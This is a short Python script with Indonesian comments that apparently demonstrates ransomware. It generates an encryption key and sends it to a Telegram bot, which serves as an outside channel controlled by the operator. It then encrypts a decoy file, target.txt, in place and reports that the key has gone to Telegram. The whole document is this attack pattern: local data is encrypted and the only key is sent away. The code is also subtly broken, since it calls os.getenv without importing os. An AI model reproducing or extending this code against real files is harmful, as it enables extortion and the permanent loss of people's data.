import requests
from cryptography.fernet import Fernet

# --- DATA YANG SUDAH KITA TEMUKAN ---
TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = "MASUKKAN_CHAT_ID_DISINI"

def kirim_ke_telegram(pesan):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": pesan}
    try:
        requests.post(url, data=data)
    except:
        print("Koneksi gagal!")

# Generate Kunci & Pesan
kunci = Fernet.generate_key()
kunci_teks = kunci.decode()

# Kirim Notifikasi ke HP kamu
kirim_ke_telegram(f"🔓 KUNCI DEKRIPSI DITEMUKAN!\n\nUser: Kurumii-Kali\nKey: {kunci_teks}")

# Proses Enkripsi File
cipher = Fernet(kunci)
# Pastikan file target.txt ada
with open("target.txt", "w") as f:
    f.write("DOKUMEN RAHASIA NEGARA - JANGAN DIBUKA")

with open("target.txt", "rb") as f:
    konten = f.read()

terkunci = cipher.encrypt(konten)

with open("target.txt", "wb") as f:
    f.write(terkunci)

print("[-] File target.txt telah dienkripsi.")
print("[+] Kunci telah dikirim ke Telegram!")
